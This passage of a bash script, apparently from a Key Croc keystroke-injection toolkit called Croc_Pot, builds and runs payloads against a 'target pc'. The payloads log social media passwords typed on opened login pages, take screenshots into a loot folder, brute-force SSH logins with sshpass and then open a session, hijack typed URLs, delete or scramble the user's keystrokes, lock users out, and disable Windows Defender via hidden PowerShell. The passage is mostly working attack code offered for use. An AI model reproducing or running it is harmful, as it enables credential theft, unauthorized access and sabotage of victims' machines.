				Q STRING "sleep 2; import -window root /media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\$(whoami)/KeyCroc/; sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
				Q ENTER ; Q ALT-TAB ; sleep 2 ; ATTACKMODE HID ;;
			*)
				Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1
				Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
				Q ENTER ; sleep 3 ; Q STRING "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)" ; Q ENTER ; sleep 1
				Q STRING "sleep 2; import -window root /media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\$(whoami)/KeyCroc/; sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
				Q ENTER ; Q ALT-TAB ; sleep 2 ; ATTACKMODE HID ;;
			esac
		fi ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; screen_shot ;;
esac
}
##
#----Croc_Bite payload social media account passwd Attempt
##
croc_bite() {
	clear
	echo -ne "$(Info_Screen '
-Attempt to retrieve target pc Social media account passwd
-Create a payload called Croc_Bite.txt MATCH word will be Social media name 
-This will open target pc web browser and open up Social media login page
-If successful passwd saved at /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered
-Ensure to run Croc_Pot_Payload.txt first')\n"
	echo -ne "$(ColorRed '--THIS PAYLOAD IS RELYING ON THE ENTER KEY TO BE PRESSED\n
--AFTER THE USER HAS ENTER THE PASSWORD')\n\n"
##
#----check for existing Croc_Bite payload
##
if [ -e "/root/udisk/payloads/Croc_Bite.txt" ]; then
	echo -ne "${yellow}Existing Croc_Bite payload${clear}\n${LINE}\n"
	cat /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered ; echo -ne "\n${LINE}\n"
	cat /root/udisk/payloads/Croc_Bite.txt ; echo -ne "\n${LINE}\n"
	read_all USE EXISTING CROC_BITE PAYLOAD Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		echo -ne "${yellow}Keeping existing Croc_Bite payload${clear}\n"
		install_payloads ;;
	[nN] | [nN][oO])
		echo -ne "${red}Removing existing Croc_Bite payload${clear}\n"
		rm /root/udisk/tools/Croc_Pot/Croc_Bite.txt /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered /root/udisk/payloads/Croc_Bite.txt ;;
	*)
		invalid_entry ; croc_bite ;;
	esac
else
	echo -ne "${yellow}No existing Croc_Bite payload${clear}\n"
fi
##
#----Create Croc_Bite payload
##
bite_payload() {
	echo -ne "# Title:         Croc_Bite\n# Description:   Social media account passwd attempt this will open target pc web browser and open login page\n# Author:        Spywill\n# Version:       1.0\n# Category:      Key Croc\n\nMATCH ${1}\n
if [ -e \"/root/udisk/tools/Croc_Pot/Croc_OS.txt\" ]; then\n	case \$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in\nWINDOWS)\n	Q GUI d\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell -NoP -NonI -W Hidden -Exec Bypass\"\n	Q ENTER
	sleep 2\n	Q STRING \"Start-Process ${@:2}; exit\"\n	Q ENTER\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_Bite.txt UNTIL ENTER\necho \"${1}\" >> /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered\n	LED ATTACK ;;\nLINUX)\n	case \$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt) in
raspberrypi)\n	Q CONTROL-ALT-d\n	Q CONTROL-ALT-t\n	sleep 1\n	Q STRING \"gio open ${@:2}; exit\"
	Q ENTER\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_Bite.txt UNTIL ENTER\necho \"${1}\" >> /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered\n	LED ATTACK ;;\n$HOST_CHECK)\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"\n	Q ENTER\n	sleep 1\n	Q STRING \"gio open ${@:2}; exit\"
	Q ENTER\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_Bite.txt UNTIL ENTER\necho \"${1}\" >> /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered\n	LED ATTACK ;;\n*)\n	Q ALT F2\n	sleep 1\n	Q STRING \"xterm\"\n	Q ENTER\n	sleep 1\n	Q STRING \"gio open ${@:2}; exit\"
	Q ENTER\nSAVEKEYS /root/udisk/tools/Croc_Pot/Croc_Bite.txt UNTIL ENTER\necho \"${1}\" >> /root/udisk/tools/Croc_Pot/Croc_Bite.txt.filtered\n	LED ATTACK ;;\n	esac\n	esac\nelse\n	LED R\nfi\nLED FINISH" >> /root/udisk/payloads/Croc_Bite.txt
	echo -ne "${green}-Croc_Bite payload install check payloads folder\n
	unplug keycroc plug back in type in match word ${1}${clear}\n"
	echo -ne "\n${LINE}\n" ; cat /root/udisk/payloads/Croc_Bite.txt ; echo -ne "\n${LINE}\n"
}
##
#----Croc_Bite menu
##
MenuTitle CROC BITE MENU ; MenuColor 19 1 FACEBOOK ATTEMPT ; MenuColor 19 2 INSTAGRAM ATTEMPT ; MenuColor 19 3 TWITTER ATTEMPT ; MenuColor 19 4 TIKTOK ATTEMPT
MenuColor 19 5 MESSENGER ATTEMPT ; MenuColor 19 6 GOOGLE ATTEMPT ; MenuColor 19 7 MICROSOFT ATTEMPT ; MenuColor 19 8 RETURN TO MAIN MENU ; MenuEnd 22
	case $m_a in
	1) bite_payload facebook https://www.facebook.com/login/ ; install_payloads ;; 2) bite_payload instagram https://www.instagram.com/accounts/login/ ; install_payloads ;; 3) bite_payload twitter https://twitter.com/login/ ; install_payloads ;; 4) bite_payload tiktok https://careers.tiktok.com/login ; install_payloads ;;
	5) bite_payload messenger https://www.messenger.com/login/ ; install_payloads ;; 6) bite_payload google https://accounts.google.com/signin ; install_payloads ;; 7) bite_payload microsoft https://login.microsoftonline.com/ ; install_payloads ;;
	8) main_menu ;; 0) exit 0 ;; [bB]) install_payloads ;; *) invalid_entry ; reboot_shutdown ;;
	esac
}
##
#----Croc_Redirect, payload/open web site on target pc default browser
##
web_site() {
	clear
	echo -ne "$(Info_Screen '
-Enter website name example: https://forums.hak5.org/
-This will open target pc default web browser and start website
-Croc_Redirect payload match words https:// or http:// or IP address
-Simple payload to Redirect target web page
-Recommended to uninstall payload when not in use, do to match word
-Edit payload for web site to be Redirect
-NOTE:anytime https:// or http:// or IP address is type in
this will activate this payload')\n\n"
##
#----Croc_Redirect payload install
##
	local Croc_Redirect=/root/udisk/payloads/Croc_Redirect.txt
if [ -e "${Croc_Redirect}" ]; then
	echo -ne "\n${LINE_}$(ColorGreen 'Croc_Redirect.txt Payload is installed check payload folder')${LINE_}\n"
	echo -ne "\n${LINE}\n" ; cat ${Croc_Redirect} ; echo -ne "\n${LINE}\n"
else
	read_all INSTALL CROC_REDIRECT PAYLOAD Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
	echo -ne "# Title:           Croc_Redirect\n# Description:     Simple payload to Redirect target web page\n#                  when not in use recommended to uninstall because of match words\n# Author:          spywill\n# Version:         1.1\n# Category:        Key Croc\n#\n#
MATCH (^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\$|http://|https://|\.com|\.br|\.net|\.org|.cz|\.au|\.co|\.jp|\.cn|\.ru|\.in|\.ir|\.ua|\.ca|\.xyz|\.site|\.top|\.icu|\.vip|\.online|\.de)\n\n#-->Enter Redirected web page here\nREDIRECT=https://forums.hak5.org/\n
#-->Remove user input and replace with Redirected web page\nLED ATTACK\nQ CONTROL-SHIFT-LEFTARROW\nQ BACKSPACE\nQ CONTROL-SHIFT-LEFTARROW\nQ BACKSPACE\nQ STRING \"\${REDIRECT}\"\nQ ENTER\nLED FINISH\nsleep 1\n\n#-->This will open target pc default web browser and start website\nif [ -e /root/udisk/tools/Croc_Pot/Croc_OS.txt ]; then
	LED ATTACK\n	OS_CHECK=\$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n	HOST_CHECK=\$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)\n	case \$OS_CHECK in\nWINDOWS)\n	Q GUI d\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell\"\n	Q ENTER\n	sleep 2
	Q STRING \"Start-Process \${REDIRECT}; exit\"\n	Q ENTER\n	LED FINISH ;;\nLINUX)\n	case \$HOST_CHECK in\nraspberrypi)\n	Q CONTROL-ALT-d\n	Q CONTROL-ALT-t\n	sleep 1\n	Q STRING \"gio open \${REDIRECT}; exit\"\n	Q ENTER\n	LED FINISH ;;
\$HOST_CHECK)\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"\n	Q ENTER\n	sleep 1\n	Q STRING \"gio open \${REDIRECT}; exit\"\n	Q ENTER\n	LED FINISH ;;\n*)\n	Q ALT F2\n	sleep 1\n	Q STRING \"xterm\"\n	Q ENTER\n	sleep 1\n	Q STRING \"gio open \${REDIRECT}; exit\"
	Q ENTER\n	LED FINISH ;;\n	esac\n	;;\nesac\nelse\n	LED R\nfi\n" >> ${Croc_Redirect}
		echo -ne "\n${green}Croc_Redirect.txt payload is now install check payloads folder${clear}\n"
		echo -ne "\n${LINE}\n" ; cat ${Croc_Redirect} ; echo -ne "\n${LINE}\n" ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; web_site ;;
	esac
fi
##
#----Enter web site and start web browser run from terminal
##
read_all ENTER AND START WEB SITE Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	read_all ENTER WEB SITE NAME AND PRESS [ENTER]
	start_web ${r_a} ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; web_site ;;
esac
}
##
#----NO_SLEEPING, Keep target pc screen from sleeping QUACK spacebar every 60 sec and backspace
##
screen_on() {
	clear
	echo -ne "$(Info_Screen '
-No_sleeping payload MATCH word is nosleeping
-Keep Target pc screen from going to sleep
-This will QUACK spacebar every 60 sec and backspace
-PRESS CTRL + C to break loop in terminal')\n\n"
##
#----No_Sleeping payload install
##
local No_sleep=/root/udisk/payloads/No_Sleeping.txt
if [ -e "${No_sleep}" ]; then
	echo -ne "\n$(ColorGreen 'No_Sleeping PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
	echo -ne "\n${LINE}\n" ; cat /root/udisk/payloads/No_Sleeping.txt ; echo -ne "\n${LINE}\n"
else
	read_all INSTALL NO_SLEEPING PAYLOAD Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
	echo -ne "# Title:           No sleeping\n# Description:     Keep Target pc screen from going to sleeping\n# Author:          spywill\n# Version:         1.1\n# Category:        Key Croc
#\n#\nMATCH nosleeping\n\nQ GUI d\nwhile true ;do\nLED ATTACK\nWAIT_FOR_KEYBOARD_INACTIVITY 60\nQ KEYCODE 00,00,2c\nQ BACKSPACE\nLED R\ndone" >> ${No_sleep}
		echo -ne "\n$(ColorGreen 'No_Sleeping PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')\n"
		echo -ne "\n${LINE}\n" ; cat /root/udisk/payloads/No_Sleeping.txt ; echo -ne "\n${LINE}\n" ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; screen_on ;;
	esac
fi
##
#----Start No sleeping run from terminal
##
read_all START NO_SLEEPING PAYLOAD NOW Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	local i=1
	reset_broken
	Q GUI d
	LED ATTACK
	while true ;do
		if [ $broken -eq 1 ]; then
			LED B
			break
		fi
		WAIT_FOR_KEYBOARD_INACTIVITY 60
		Q KEYCODE 00,00,2c
		Q BACKSPACE
		echo -ne "${yellow}NO_SLEEPING PAYLOAD IS RUNNING COUNT: ${clear}${green}$(( i++ ))\033[0K\r${clear}"
	done ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ; install_payloads ;;
*) 
	invalid_entry ; screen_on ;;
esac
}
##
#----Croc_replace, Replace user text with random characters payload
##
text_replace() {
	clear
	echo -ne "$(Info_Screen '
-Replace user text with random characters
-This will install Croc_replace.txt payload in payloads folder
-Enter the amount of characters to replace
-NOTE: After payload has ran this will insert #
infront of match to disable Croc_replace.txt payload
-Restart payload enter arming mode and remove #')\n\n"
##
#----Croc_replace payload install
##
	local croc_replace=/root/udisk/payloads/Croc_replace.txt
if [ -e "${croc_replace}" ]; then
	echo -ne "\n$(ColorGreen 'Croc_replace PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
	echo -ne "\n${LINE}\n" ; cat ${croc_replace} ; echo -ne "\n${LINE}\n"
else
	read_all INSTALL CROC_REPLACE PAYLOAD Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		read_all ENTER NUMBER OF CHARACTER TO REPLACE AND PRESS [ENTER]
	echo -ne "# Title:           Croc_replace\n# Description:     Replace user text with random characters enter a number for the amount to change\n#                  NOTE: TO restart this payload enter arming mode and remove the # in front of match
# Author:          spywill\n# Version:         1.1\n# Category:        Key Croc\n#\n#\nMATCH (?i)[0-9 a-z]\n\n#--->Enter the amount of characters to change here\nchar=${r_a}\n\necho -n \"\$(( i++ ))\" >> /tmp/text_replace.txt\nvar=\$(< /tmp/text_replace.txt)\n
if [[ \${#var} -gt \${char} ]] ; then\n	LED B\n	DISABLE_PAYLOAD payloads/Croc_replace.txt\n	sed -i '9s/^/#/' /root/udisk/payloads/Croc_replace.txt\n	RELOAD_PAYLOADS\nelse\n	Q CONTROL-SHIFT-LEFTARROW\n	Q BACKSPACE\n	Q STRING \"\$(< /dev/urandom tr -cd '[:graph:]' | tr -d '\\\\\' | head -c 1)\$(< /dev/urandom tr -cd '[:graph:]' | tr -d '\\\\\' | head -c 1)\"
	LED R\nfi" >> ${croc_replace}
		echo -ne "\n$(ColorGreen 'Croc_replace PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')\n"
		echo -ne "\n${LINE}\n" ; cat ${croc_replace} ; echo -ne "\n${LINE}\n" ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; text_replace ;;
	esac
fi
##
#----Start Croc_replace run from terminal
##
read_all START CROC_REPLACE NOW Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	local i=1
	read_all ENTER NUMBER OF CHARACTER TO REPLACE AND PRESS [ENTER] ; local char=${r_a}
	LED ATTACK
	while true ; do
		WAIT_FOR_KEYBOARD_ACTIVITY 0
		echo -n $(( i++ )) >> /tmp/text_replace.txt
		var=$(< /tmp/text_replace.txt)
		if [[ ${#var} -gt ${char} ]]; then
			LED B
			break
		else
			Q CONTROL-SHIFT-LEFTARROW
			Q BACKSPACE
			Q STRING "$(< /dev/urandom tr -cd '[:graph:]' | tr -d '\\' | head -c 1)$(< /dev/urandom tr -cd '[:graph:]' | tr -d '\\' | head -c 1)"
			echo -ne "${yellow}KEYCROC HAS REPLACE USER INPUT COUNT: ${clear}${green}$(( i++ ))\033[0K\r${clear}"
		fi
	done ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*) 
	invalid_entry ; text_replace ;;
esac
}
##
#----Croc_Force, Brute-force attack on ssh host
##
Brute_force() {
	clear
	echo -ne "$(Info_Screen '
-Payload call Croc_Force, Brute-force attack on ssh host
-Brute-force attack consists of an attacker submitting many passwords or
passphrases with the hope of eventually guessing correctly.
-Add your own word list or install american-english-huge list
-Run Croc_Force live and if successful view passwd & start ssh session
-Run Croc_Force_payload will run in background, match word is crocforce
if successful save to loot/Croc_Pot/Croc_Force_Passwd.txt
Edit payload for target: IP, hostname and full path of word list
-PRESS CTRL + C to break loop in terminal
when running payload the LED lights
-LED red -> and nothing after target is unreachable & payload disable
-LED flash red & blue -> attempting Brute-force attack
-LED green -> successful & payload disable
-Requirements: SSHPASS')\n\n"
install_package sshpass SSHPASS Brute_force
##
#----Croc_force payload install
##
local CROC_FORCE=/root/udisk/payloads/Croc_Force_payload.txt
if [ -f ${CROC_FORCE} ]; then
	echo -ne "\n${red}${LINE_}${clear}$(ColorGreen 'CROC_FORCE PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
	echo -ne "\n${LINE}\n" ; cat ${CROC_FORCE} ; echo -ne "\n${LINE}\n"
else
	read_all INSTALL CROC_FORCE PAYLOAD Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
		read_all ENTER TARGET HOST NAME AND PRESS [ENTER]; local T_H=${r_a}
		read_all ENTER TARGET IP AND PRESS [ENTER]; local T_IP=${r_a}
		if [[ ${T_IP} =~ ${validate_ip} ]]; then
			echo -ne "${green}IP OK${clear}\n"
		else
			invalid_entry ; Brute_force
		fi
		echo -ne "${yellow}Add ramdom numbers to the end of each word enter 0 for no numbers\nOr enter 10 or 100 or 1000 depend on how many numbers at end of word${clear}\n"
		read_all ENTER RAMDOM NUMBER AMOUNT AND PRESS [ENTER] ; local U_N=${r_a}
		echo -ne "${yellow}Enter the full path of word list or use /usr/share/dict/american-english-huge${clear}\n"
		read_all ENTER FULL PATH OF WORD LIST LOCATION AND PRESS [ENTER]
		if [ -f "${r_a}" ]; then
			echo -ne "${yellow}Word list was located${clear}\n"
			local U_L=${r_a}
		else
			invalid_entry ; echo -ne "\n${red}Did not find Word list please try again${clear}\n" ; Brute_force
		fi
	echo -ne "# Title:         Croc_Force\n#\n# Description:   Brute-force attack consists of an attacker submitting many passwords or\n#                passphrases with the hope of eventually guessing correctly. Requirements: SSHPASS
#                Save to loot/Croc_Pot/Croc_Force_Passwd.txt\n#\n# Author:        Spywill\n# Version:       1.1\n# Category:      Key Croc\n\nMATCH crocforce\n\n#--->Add Target IP here\nT_IP=${T_IP}\n\n#--->Add Target HOSTNAME here
T_H=${T_H}\n\n#--->Add the full path of word list here or install wamerican-huge add use /usr/share/dict/american-english-huge\nWORDFILE=\"${U_L}\"\ntL=\`awk 'NF!=0 {++c} END {print c}' \$WORDFILE\`\n
#--->Add ramdom numbers to the end of each word enter 0 for no numbers Or enter 10 or 100 or 1000 depend on how many numbers at end of word\nNUMBER_N=${U_N}\n\nnc -z -v -w 1 \$T_IP 22 &>/dev/null 2>&1
if [[ \$? -ne 0 ]]; then\n	LED R && RELOAD_PAYLOADS && exit\nelse\n	LED B\nfi\n\nwhile true ; do\nLED B\nunset rnum R_W\nrnum=\$((RANDOM%\${tL}+1))\nR_W=\$(sed -n \"\$rnum p\" \$WORDFILE)\n\nif [ ! \"\${NUMBER_N}\" = \"0\" ] ; then\n	R_N=\$(( \$RANDOM % \${NUMBER_N}+1 ))
else\n	unset R_N\nfi\n\nif [[ \"\$(sshpass -p \$R_W\$R_N ssh -o \"StrictHostKeyChecking no\" \$T_H@\$T_IP 'echo ok' | sed 's/\\\r//g')\" = \"ok\" ]]; then
	echo -ne \"Target Hostname: \$T_H\\\nTarget IP: \$T_IP\\\nTarget password: \$R_W\$R_N\" > /root/udisk/loot/Croc_Pot/Croc_Force_Passwd.txt\n	LED G\n	break\nelse\n	LED R\nfi\ndone" >> ${CROC_FORCE}
		echo -ne "\n${red}${LINE_}${clear}$(ColorGreen 'CROC_FORCE PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')${red}${LINE_}${clear}\n"
		echo -ne "\n${LINE}\n" ; cat ${CROC_FORCE} ; echo -ne "\n${LINE}\n" ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; Brute_force ;;
	esac
fi
##
#----Croc_force start BRUTE-FORCE ATTACK run from terminal
##
read_all START BRUTE-FORCE ATTACK Y/N AND PRESS [ENTER] ; local B_M=${r_a}
case $B_M in
[yY] | [yY][eE][sS])
	read_all [Y]-AMERICAN ENGLISH WORD LIST [N]-ADD WORD LIST AND PRESS [ENTER] ; local W_L=${r_a}
	case $W_L in
		[yY] | [yY][eE][sS])
			install_package wamerican-huge AMERICAN_WORDLIST Brute_force ; local U_L="/usr/share/dict/american-english-huge"
			echo -ne "\n${green}Word list was located ${clear}->${U_L}\n" ;;
		[nN] | [nN][oO])
			read_all ENTER FULL PATH OF WORD LIST LOCATION AND PRESS [ENTER]
			if [ -f "${r_a}" ]; then
				local U_L=${r_a}
				echo -ne "\n${green}Word list was located ${clear}->${U_L}\n"
			else
				invalid_entry ; echo -ne "\n${red}Did not find Word list please try again${clear}\n" ; Brute_force
			fi ;;
		*)
			invalid_entry ; Brute_force ;;
	esac
echo -ne "${yellow}Add ramdom numbers to the end of each word enter 0 for no numbers\nOr enter 10 or 100 or 1000 depend on how many numbers at end of word${clear}\n"
read_all ENTER RAMDOM NUMBER AMOUNT AND PRESS [ENTER] ; local U_N=${r_a}
read_all ENTER TARGET IP AND PRESS [ENTER] ; local T_IP=${r_a}
	if [[ ${T_IP} =~ ${validate_ip} ]]; then
		unset -f ping_alert && killall tcpdump 2> /dev/null
		ping -q -c 1 -w 1 ${T_IP} &>/dev/null 2>&1
		if [[ $? -ne 0 ]]; then
			LED R
			echo -ne "\n${red}Unable to reach host ${clear}->${T_IP}\n"
			sleep 1
			Brute_force
		elif [[ "${#args[@]}" -eq 0 ]]; then
			read_all ENTER TARGET HOST NAME AND PRESS [ENTER] ; local T_H=${r_a}
		fi
	else
		invalid_entry ; Brute_force
	fi
local WORDFILE=${U_L}
local NUMBER_N=${U_N}
local tL=`awk 'NF!=0 {++c} END {print c}' $WORDFILE`
	local i=1
	reset_broken
while true ; do
	LED B
	unset rnum R_W
	rnum=$(( $RANDOM % ${tL}+1 ))
	R_W=$(sed -n "$rnum p" $WORDFILE)
	if [ ! "${NUMBER_N}" = "0" ]; then
		R_N=$(( $RANDOM % ${NUMBER_N}+1 ))
	else
		unset R_N
	fi
	echo -e "${yellow}Trying:${clear} $R_W$R_N ${yellow}COUNT: ${clear}${green}$(( i++ ))${clear}\n"
	if [[ "$(sshpass -p $R_W$R_N ssh -o "StrictHostKeyChecking no" $T_H@$T_IP 'echo ok' | sed 's/\r//g')" = "ok" ]]; then
		LED G
		echo -ne "${yellow}Target Hostname: ${clear}$T_H\n${yellow}Target IP: ${clear}$T_IP\n${yellow}password is:${clear} ${green}$R_W$R_N${clear}\n" | tee /root/udisk/loot/Croc_Pot/Croc_Force_Passwd.txt
		sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" /root/udisk/loot/Croc_Pot/Croc_Force_Passwd.txt
		read_all START SSH SESSION Y/N PRESS [ENTER] ; local ST_SS=${r_a}
		case $ST_SS in
			[yY] | [yY][eE][sS])
				sshpass -p ${R_W}${R_N} ssh ${T_H}@${T_IP} ;;
			[nN] | [nN][oO])
				echo -ne "\n$(ColorYellow 'Check at loot/Croc_Pot/Croc_Force_Passwd.txt')\n" ;;
			*)
				invalid_entry ;;
		esac
		break
	elif [ $broken -eq 1 ]; then
		break
	else
		LED R
	fi
done ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ; install_payloads ;;
*)
	invalid_entry ; Brute_force ;;
esac
}
##
#----Croc_Lockout Payload/function Prevent user from logging-in, delete all keystroke entry
##
croc_lock() {
	clear
	echo -ne "$(Info_Screen '
-Croc_Lockout payload match word croclockout
-Prevent user from logging-in this will delete all keystroke entry
-When running payload type stop to break loop
-PRESS CTRL + C to break loop in terminal
-If stuck in loop unplug keycroc plug back in
-If CrocUnlock Payload is installed this will remove it
they both use Q GUI-l in the payload')\n\n"
##
#----Croc_Lockout payload install
##
	local Croc_lockout=/root/udisk/payloads/Croc_Lockout.txt
if [ -e "${Croc_lockout}" ]; then
	echo -ne "\n$(ColorGreen 'Croc_Lockout PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
	echo -ne "\n${LINE}\n" ; cat ${Croc_lockout} ; echo -ne "\n${LINE}\n"
else
read_all INSTALL CROC_LOCKOUT PAYLOAD Y/N AND PRESS [ENTER]
	case $r_a in
	[yY] | [yY][eE][sS])
	echo -ne "# Title:         Croc_Lockout\n#\n# Description:   Prevent user from logging-in this will delete all keystroke entry\n#                To stop payload type in stop If stuck in loop unplug keycroc plug back in
#\n# Author:        Spywill\n# Version:       1.1\n# Category:      Key Croc\n\nMATCH croclockout\n\nQ GUI-l\n#Q CONTROL-ALT-F3\n\nif [ -e \"/root/udisk/payloads/Croc_unlock_1.txt\" ]; then
	rm /root/udisk/payloads/Croc_unlock_1.txt /root/udisk/payloads/Croc_unlock_2.txt\nfi\n\nSAVEKEYS /tmp/Croc_Lockout_stop.txt UNTIL stop\n\nwhile true ; do\nLED ATTACK\nWAIT_FOR_KEYBOARD_ACTIVITY 0
if [ \$(sed -n 's/.*\(stop\).*/\1/p' /tmp/Croc_Lockout_stop.txt.filtered) = \"stop\" ]; then\n	LED B\n	sleep 1\n	LED OFF\n	RELOAD_PAYLOADS\n	break\nelse\n	Q CONTROL-SHIFT-LEFTARROW\n	Q BACKSPACE\n	Q CONTROL-SHIFT-LEFTARROW\n	Q BACKSPACE\n	LED R\nfi\ndone\n " >> ${Croc_lockout}
		echo -ne "\n$(ColorGreen 'Croc_Lockout PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')\n"
		echo -ne "\n${LINE}\n" ; cat ${Croc_lockout} ; echo -ne "\n${LINE}\n" ;;
	[nN] | [nN][oO])
		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
	*)
		invalid_entry ; croc_lock ;;
	esac
fi
##
#----Croc_Lockout start lockout run from terminal
##
read_all START CROC_LOCKOUT NOW Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "\n${yellow}PRESS CTRL + C TO STOP LOOP${clear}\n"
	if [ -e "/root/udisk/payloads/Croc_unlock_1.txt" ]; then
		rm /root/udisk/payloads/Croc_unlock_1.txt /root/udisk/payloads/Croc_unlock_2.txt
		RELOAD_PAYLOADS
	fi
	local i=1
	reset_broken
	Q GUI-l
	Q CONTROL-ALT-F3
	LED ATTACK
	while true ; do
		WAIT_FOR_KEYBOARD_ACTIVITY 0
		if [ $broken -eq 1 ]; then
			break
		else
			Q CONTROL-SHIFT-LEFTARROW
			Q BACKSPACE
			Q CONTROL-SHIFT-LEFTARROW
			Q BACKSPACE
			echo -ne "${yellow}KEYCROC HAS DELETE USER INPUT COUNT: ${clear}${green}$(( i++ ))\033[0K\r${clear}"
		fi
	done ;;
[nN] | [nN][oO])
	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
*)
	invalid_entry ; croc_lock ;;
esac
}
##
#----Windows defender ENABLE/DISABLE/PAYLOAD Function
##
windows_defender() {
	clear
	echo -ne "$(Info_Screen '
-Windows defender ENABLE/DISABLE
-Install payload called Croc_Defender.txt
-MATCH word defenderenable to enable windows Defender
-MATCH word defenderdisable to Disable windows Defender')\n\n"
if [ "$(OS_CHECK)" = WINDOWS ]; then
##
#----Windows defender enable run from terminal
##
defender_enable() {
	Q GUI i ; sleep 3 ; Q STRING "Windows Security settings" ; Q ENTER ; sleep 3 ; Q ENTER ; sleep 3 ; Q TAB ; Q ENTER ; sleep 3 ; Q TAB ; Q TAB ; Q TAB ; Q TAB ; Q ENTER ; sleep 2 ; Q LEFTARROW ; Q ENTER ; sleep 1 ; Q ALT-F4 ; sleep 1 ; Q ALT-F4
}
##
#----Windows defender disable run from terminal
##
defender_disable() {
	Q GUI i ; sleep 3 ; Q STRING "Windows Security settings" ; Q ENTER ; sleep 3 ; Q ENTER ; sleep 3 ; Q TAB ; Q ENTER ; sleep 3 ; Q TAB ; Q TAB ; Q TAB ; Q TAB ; Q ENTER ; sleep 2 ; Q KEYCODE 00,00,2c ; sleep 2 ; Q LEFTARROW ; Q ENTER ; sleep 1 ; Q ALT-F4 ; sleep 1 ; Q ALT-F4
}
##
#----Croc_Defender payload install
##
croc_defender() {
local C_D=/root/udisk/payloads/Croc_Defender.txt
if [ -e "${C_D}" ]; then
	echo -ne "\n$(ColorGreen 'Croc_Defender PAYLOAD IS INSTALLED CHECK PAYLOADS FOLDER')\n"
	echo -ne "\n${LINE}\n" ; cat ${C_D} ; echo -ne "\n${LINE}\n"
else
	read_all INSTALL CROC_DEFENDER PAYLOAD Y/N AND PRESS [ENTER]
case $r_a in
[yY] | [yY][eE][sS])
	echo -ne "# Title:           Croc_Defender\n# Description:     Disable/enable windows Defender with QUACK entry\n#                  Type defenderenable to enable windows Defender\n#                  Type defenderdisable to Disable windows Defender\n# Author:          spywill\n# Version:         1.0\n# Category:        Key Croc\n
